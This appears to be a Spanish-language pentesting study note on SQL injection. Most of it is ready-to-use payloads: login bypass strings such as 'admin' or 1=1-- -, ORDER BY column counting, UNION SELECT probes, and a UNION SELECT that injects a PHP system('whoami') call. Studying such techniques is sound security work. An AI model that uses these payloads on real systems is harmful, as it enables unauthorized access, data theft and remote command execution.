### Autenticación débil basada en SQL:
- Formulario de inicio de sesión (username - passwd) donde la inyección intenta **eludir la autenticación.**
```sql
SELECT * FROM users WHERE username='' AND passwd=''
1. username='admin' or 1=1-- - AND passwd='admin'
2. username='admin' or 1=1#
3. user='admin' -- || user='admin'-- -
```
<p align="center">
  <img src="https://i.postimg.cc/Fs1s7nJQ/sql-ejemplo-bool.png" alt="sql"/>
</p>
#### Determina el número de columnas devueltas por la consulta
- Aprovechando el manejo de error en la respuesta para saber el total de columnas.
```sql
SELECT password,email FROM users WHERE username='pepe'' order by 2-- -
1. username order by 2-- -
2. username order by 3-- -//Devuelve error ya que al comienzo solo se seleccionan 2
```
<p align="center">
  <img src="https://i.postimg.cc/Z5MNWdqw/sql-ejemplo-error-ORDER-BY.png" alt="sql"/>
</p>
**Error ORDER BY**
<p align="center">
  <img src="https://i.postimg.cc/pL3FQXxF/ERROR-sql.png" alt="sql"/>
</p>

- Combinar del 1 hasta el total de columnas de la tabla con UNION SELECT
```sql
SELECT password,email FROM users WHERE username='pepe' union select 1,2-- -
SELECT password,email FROM users WHERE username='pepe' union select NULL,NULL-- -
//Este último va en la URL
```
+ Mostrar una posible inyección de código PHP
```sql
SELECT password,email FROM users WHERE id=1 UNION SELECT "<?php system('whoami'); ?>",user();-- -;
```
<p align="center">
  <img src="https://i.postimg.cc/Z5KPBmx5/sql-inyeccion-code-y-dbuser.png" alt="sql"/>
</p>
- Mas ejemplos con el uso de UNION SELECT '',''-- -
<p align="center">
  <img src="https://i.postimg.cc/6qxB0qpy/mas-ejemplos-con-UNION.png" alt="sql"/>
</p>
